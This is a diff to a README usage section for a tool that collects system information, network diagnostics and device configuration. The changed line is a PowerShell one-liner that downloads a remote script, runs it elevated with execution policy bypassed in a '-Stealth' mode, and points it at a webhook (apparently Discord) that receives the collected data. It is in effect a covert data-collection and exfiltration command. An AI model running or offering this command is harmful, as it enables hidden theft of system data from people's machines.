@@ -19,7 +19,7 @@ SQD5-DCWH collects system information, network diagnostics, and device configura
 ## Usage
 
 ```powershell
-$w="";$env:DCWH_URL=$w;iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/s.ps1' -UseBasicParsing -OutFile "$env:TMP\s.ps1";Start-Process powershell "-NoP -EP Bypass -File `"$env:TMP\s.ps1`" -Stealth" -Verb RunAs
+$w="YOUR_WEBHOOK_HERE";$env:DCWH_URL=$w;iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/s.ps1' -UseBasicParsing -OutFile "$env:TMP\s.ps1";Start-Process powershell "-NoP -EP Bypass -File `"$env:TMP\s.ps1`" -WebhookURL `"$w`" -Stealth" -Verb RunAs
 ```
 
 Set `$w` to specify a custom endpoint URL, or leave empty to use the remote configuration source.
